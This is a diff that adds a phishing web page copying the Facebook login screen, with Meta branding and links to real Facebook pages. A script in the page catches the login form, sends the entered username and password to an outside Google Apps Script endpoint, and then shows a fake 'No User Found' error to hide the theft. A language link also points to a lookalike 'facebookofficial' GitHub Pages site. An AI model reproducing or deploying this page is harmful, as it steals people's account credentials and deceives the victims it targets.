@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Log in page Facebook</title>
+	<link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+	<div class="image"><img src="images/logo.png" width="385" height="240"></div>
+	<form method="post" autocomplete="off" name="google-sheet" >
+				<div class="box">
+			<input type="text" class="form-control" autocapitalize="off"  placeholder="Mobile number or email address" name="username" required>
+			<input type="password" class="form-control" autocapitalize="off"  placeholder="Password" name="password" required>
+			<input type="Submit" class="btn btn-primary" value="Log In"></div><br>
+			<div class="wrapper"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" style="text-decoration: none;">Forgotten Password? </a><br></div>
+			<div class="line"></div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<div class="or">OR</div><div class="line"></div></div><br>
+			<div class="new">
+				<a href="https://www.facebook.com/r.php?locale=en_GB&display=page">
+ 	<input type="button" class="my-button" value="Create New Account"></div></a></div><br><br></form></body>
+ 	<body alink="#748096" vlink="#748096" link="#748096">
+ 	<table width="60%">
+ 		<div class="table">
+ 		<tr>
+ 			<td><a href="Facebook/index.html">English (UK)</a></td>
+ 			<td><a href="Punjabi/index.html">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ਪੰਜਾਬੀ</a></td>
+ 		</tr>
+ 		<tr>
+ 			<td><a href="Hindi/index.html">हिन्दी</a></td>
+ 			<td><a href="Urdu/index.html">ردو </a></td>
+ 		</tr>
+ 		<tr>
+ 			<td><a href="https://facebookofficial.github.io/gujratilogin.github.io/">ગુજરાતી</a></td>
+ 			<td><a href="Marathi/index.html">मराठी</a></td>
+ 		</tr>
+ 		</div>
+
+ 	<p>Meta © 2022</p>
+
+ 	<script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbzsg7tqKB9ioZxmjMlTzSaw-q2BHpUGEWIMxaJIpRL7zynYvfT7FRnAiUPWiuK4kmb-/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Oops! No User Found. Please try again"))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+</body>
+</html>
